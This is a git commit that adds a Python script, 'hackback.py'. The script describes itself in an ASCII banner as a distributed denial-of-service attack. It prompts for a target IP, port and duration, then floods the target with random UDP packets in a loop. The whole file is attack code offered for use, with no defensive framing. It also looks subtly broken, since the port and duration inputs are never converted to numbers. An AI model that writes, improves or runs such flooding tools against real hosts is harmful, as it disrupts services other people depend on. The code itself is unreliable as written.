7f8cb4ea00b081bc710c84f3fc50ae81243c4ebc
xohan30 <48544502+xohan30@users.noreply.github.com>
2020-07-08 12:45:58 +0530

    Add files via upload
    Python tool File

---
+++ hackback.py
@@ -0,0 +1,55 @@
+import os
+import sys
+import time
+import socket
+import random
+
+
+sock = socket.socket(socket.AF_INET,  socket.SOCK_DGRAM)
+
+
+bytes = random._urandom(1024)
+
+
+os.system("clear")
+
+print("""
+  ___              _   ___      _                         
+ |   \ ___ __ _ __| | | _ )_  _| |_ ___ 
+ | |) / -_) _` / _` | | _ \ || |  _/ -_)
+ |___/\___\__,_\__,_| |___/\_, |\__\___|
+                           |__/  
+                           
+        |.-----.|   DISTRIBUTED DENIAL OF SERVICE ATTACK
+        ||x . x||             
+        ||_.-._||  (not so powerful but it works)
+        `--)-(--`
+       __[=== o]___
+      |:::::::::::|\\         created by x0han30
+      `-=========-`()         
+            
+""")
+print(" ")
+print("Enter the target IP : ")
+ip = input(">>> ")
+print(" ")
+print("Enter the Port : ")
+port = input(">>> ")
+print(" ")
+print("Input Time : ")
+dur = input(">>> ")
+print(" ")
+timeout = time.time() + dur
+sent = 0
+
+while True:
+             try :
+                   if time.time() > timeout :
+                             break
+                   else:
+                             pass
+                   sock.sendto(bytes,(ip,port))
+                   sent = sent + 1
+                   print("sent %s packets to %s through port %s"%(sent,ip,port))
+             except KeyboardInterrupt :
+                   sys.exit()
